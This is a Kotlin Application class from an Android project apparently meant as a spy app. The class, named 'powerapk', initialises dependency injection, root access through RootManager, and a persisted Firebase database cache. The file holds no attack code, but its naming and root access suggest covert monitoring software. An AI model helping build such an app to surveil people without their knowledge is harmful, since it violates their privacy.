package com.my.spy.app.app

import android.app.Application
import androidx.multidex.MultiDex
import com.chrisplus.rootmanager.RootManager
import com.my.spy.app.di.component.AppComponent
import com.my.spy.app.di.component.DaggerAppComponent
import com.my.spy.app.di.module.AppModule
import com.my.spy.app.di.module.FirebaseModule
import com.my.spy.app.utils.Consts.SIZE_CACHE_FIREBASE
import com.google.firebase.FirebaseApp
import com.google.firebase.database.FirebaseDatabase


class powerapk : Application() {

    companion object {
        @JvmStatic lateinit var appComponent: AppComponent
        lateinit var root: RootManager
    }

    override fun onCreate() {
        super.onCreate()
        MultiDex.install(this)

        appComponent = DaggerAppComponent.builder().appModule(AppModule(this)).firebaseModule(FirebaseModule()).build()
        appComponent.inject(this)

        root = RootManager.getInstance()

        if (FirebaseApp.getApps(this).isNotEmpty()) {
            val database = FirebaseDatabase.getInstance()
            database.setPersistenceEnabled(true)
            database.setPersistenceCacheSizeBytes(SIZE_CACHE_FIREBASE)
        }

    }

}